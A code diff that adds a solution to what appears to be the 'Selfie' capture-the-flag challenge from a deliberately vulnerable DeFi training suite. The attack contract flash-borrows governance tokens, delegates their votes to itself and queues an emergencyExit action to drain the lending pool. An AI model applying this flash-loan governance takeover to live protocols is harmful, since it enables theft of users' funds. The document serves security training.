@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +63,10 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        SelfiePoolAttack attack = new SelfiePoolAttack(address(pool), address(token), address(governance));
+        pool.flashLoan(IERC3156FlashBorrower(attack), address(token), TOKENS_IN_POOL, abi.encodeWithSignature("emergencyExit(address)", recovery));
+        vm.warp(3 days);
+        SimpleGovernance(governance).executeAction(1);
     }
 
     /**
@@ -72,5 +76,35 @@ contract SelfieChallenge is Test {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+contract SelfiePoolAttack is IERC3156FlashBorrower {
+    bytes32 constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+    uint128 constant TOKENS_IN_POOL = 1_500_000e18;
+
+    address token;
+    address governance;
+    address selfie;
+    bool value = false;
+
+    constructor(address _selfie, address _token, address _governance) {
+        token = _token;
+        governance = _governance;
+        selfie = _selfie;
+    }
+
+    function onFlashLoan(
+        address,
+        address,
+        uint256,
+        uint256,
+        bytes calldata data
+    ) external returns (bytes32) {
+        DamnValuableVotes(token).delegate(address(this));
+        SimpleGovernance(governance).queueAction(address(selfie), 0, data);
+        DamnValuableVotes(token).approve(selfie, TOKENS_IN_POOL);
+        
+        return CALLBACK_SUCCESS;
     }
 }
